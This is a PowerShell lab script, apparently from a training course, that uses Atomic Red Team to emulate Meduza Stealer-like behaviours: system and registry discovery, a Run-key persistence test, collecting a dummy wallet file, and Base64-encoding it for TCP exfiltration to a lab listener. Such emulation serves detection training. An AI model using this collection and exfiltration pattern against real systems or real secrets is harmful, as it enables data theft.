<#
 Week 9 - Atomic Red Team run for Meduza Stealer-like behaviors.
 Run ONLY in the isolated lab VM, after taking a snapshot.
 Usage: powershell -ExecutionPolicy Bypass -File .\meduza_atomic_run.ps1 -ListenerIp 192.168.56.20
#>
param(
  [string]$ListenerIp = "192.168.56.20",   # Linux lab VM (host-only)
  [int]$ListenerPort  = 15666,
  [switch]$SkipCleanup
)

Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
$log = Join-Path $PSScriptRoot "run_log.csv"
$rows = @()
function Log($id,$tid,$status){ $script:rows += [pscustomobject]@{ Time=(Get-Date).ToUniversalTime().ToString("o"); Id=$id; Technique=$tid; Status=$status } }

# Atomic tests (verify names with -ShowDetailsBrief first)
$tests = @(
  @{Id="A1"; T="T1059.003"; Name="Create and Execute Batch Script"},
  @{Id="A3"; T="T1082";     Name="System Information Discovery"},
  @{Id="A4"; T="T1016";     Name="System Network Configuration Discovery on Windows"},
  @{Id="A5"; T="T1012";     Name="Query Registry"},
  @{Id="A6"; T="T1614.001"; Name="Discover System Language by Registry Query"},
  @{Id="A7"; T="T1547.001"; Name="Reg Key Run"}
)
# A2 (T1059.001): choose an offline test after checking -ShowDetailsBrief, then add:
# $tests += @{Id="A2"; T="T1059.001"; Name="<offline test name>"}

foreach($t in $tests){
  Write-Host "[$($t.Id)] $($t.T) - $($t.Name)" -ForegroundColor Cyan
  try {
    Invoke-AtomicTest $t.T -TestNames $t.Name -GetPrereqs | Out-Null
    Invoke-AtomicTest $t.T -TestNames $t.Name
    Log $t.Id $t.T "executed"
  } catch { Log $t.Id $t.T "error: $($_.Exception.Message)" }
  Start-Sleep -Seconds 5
}

# C1 - T1005 Data from Local System (dummy data only)
$dir = Join-Path $env:USERPROFILE "Downloads\meduza_sim"
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$dummy = Join-Path $dir "dummy_wallet.txt"
"DUMMY DATA - not a real secret - $(Get-Date -Format o)" | Set-Content $dummy
Write-Host "[C1] T1005 reading dummy file" -ForegroundColor Cyan
$data = cmd.exe /c type "$dummy"
Copy-Item $dummy (Join-Path $dir "collected.txt") -Force
Log "C1" "T1005" "executed"

# C2 - T1132.001 Base64 + T1041 exfiltration over TCP to the LAB listener only
Write-Host "[C2] T1132.001/T1041 Base64 -> ${ListenerIp}:${ListenerPort}" -ForegroundColor Cyan
try {
  $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($data -join "`n")))
  $c = New-Object System.Net.Sockets.TcpClient($ListenerIp,$ListenerPort)
  $s = New-Object System.IO.StreamWriter($c.GetStream()); $s.WriteLine($b64); $s.Flush(); $c.Close()
  Log "C2" "T1132.001,T1041" "executed"
} catch { Log "C2" "T1132.001,T1041" "error: $($_.Exception.Message)" }

$rows | Export-Csv $log -NoTypeInformation
Write-Host "Run log: $log" -ForegroundColor Green

if(-not $SkipCleanup){
  Write-Host "Cleanup..." -ForegroundColor Yellow
  foreach($t in $tests){ try { Invoke-AtomicTest $t.T -TestNames $t.Name -Cleanup | Out-Null } catch {} }
  Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
  Write-Host "Done. Export logs BEFORE reverting the snapshot." -ForegroundColor Green
}
